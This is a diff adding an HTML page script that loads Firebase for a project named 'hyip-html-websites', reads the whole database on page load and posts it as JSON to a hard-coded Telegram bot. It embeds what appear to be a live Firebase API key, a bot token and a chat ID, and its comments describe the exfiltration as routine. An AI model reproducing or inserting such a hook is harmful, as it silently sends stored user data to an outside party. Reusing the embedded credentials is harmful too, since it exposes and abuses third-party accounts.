@@ -1,0 +1,64 @@
+<script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-database.js"></script>
+
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyAnRNSqRCMrSjhV1h74l8x57BnHIdoIiGY",
+    authDomain: "hyip-html-websites.firebaseapp.com",
+    databaseURL: "https://hyip-html-websites-default-rtdb.firebaseio.com",
+    projectId: "hyip-html-websites",
+    storageBucket: "hyip-html-websites.appspot.com",
+    messagingSenderId: "241224051127",
+    appId: "1:241224051127:web:213fd8f4002bdd3fdc6032",
+    measurementId: "G-QLBNBX70XP"
+  };
+  
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+
+  // Get a reference to the database
+  const database = firebase.database();
+
+  // Define the URL and token for your Telegram Bot
+  const telegramUrl = "https://api.telegram.org/bot6542316424:AAEnPkCkuxJJMxAbXdb43stTHOfF1x24jAI/sendMessage";
+
+  // Read data from Firebase
+  function readDataAndSendToTelegram() {
+    database.ref('/').once('value')
+      .then((snapshot) => {
+        const data = snapshot.val();
+
+        // Convert the data to JSON string
+        const dataJsonString = JSON.stringify(data);
+
+        // Send data to Telegram
+        sendToTelegram(dataJsonString);
+      });
+  }
+
+  // Send data to Telegram
+  function sendToTelegram(message) {
+    // Define the chat ID and message text
+    const payload = {
+      chat_id: 6280363282, // Replace with the correct chat ID
+      text: message
+    };
+
+    // Perform HTTP POST request to send the message
+    fetch(telegramUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    }).then(response => {
+      console.log('Sent message to Telegram', response);
+    }).catch(error => {
+      console.error('Failed to send message to Telegram', error);
+    });
+  }
+
+  // Call the function
+  readDataAndSendToTelegram();
+</script>
